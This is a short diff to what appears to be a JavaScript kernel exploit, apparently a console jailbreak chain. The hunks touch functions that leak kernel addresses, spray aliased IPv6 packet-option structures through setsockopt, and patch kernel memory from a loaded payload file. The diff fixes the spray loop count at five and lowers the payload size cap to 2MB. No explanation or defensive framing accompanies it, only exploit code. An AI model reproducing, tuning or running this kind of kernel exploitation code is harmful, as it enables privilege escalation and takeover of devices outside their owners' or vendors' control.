@@ -1015,7 +1015,8 @@ function leak_kernel_addrs(sd_pair) {
 
 function make_aliased_pktopts(sds) {
   const tclass = new Word();
-  for (let loop = 0; loop < num_alias; loop++) {
+  const pktopts_loopcnt = 5;
+  for (let loop = 0; loop < pktopts_loopcnt; loop++) {
     for (let i = 0; i < num_sds; i++) {
       setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
     }
@@ -1590,7 +1591,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   // assume start of loadable segments is at offset 0x1000
   const patches = new View1(await buf, 0x1000);
   let map_size = patches.size;
-  const max_size = 0x10000000;
+  const max_size = 0x200000; // 2MB max (adjust if your payload is larger)
   if (map_size > max_size) {
     die(`patch file too large (>${max_size}): ${map_size}`);
   }
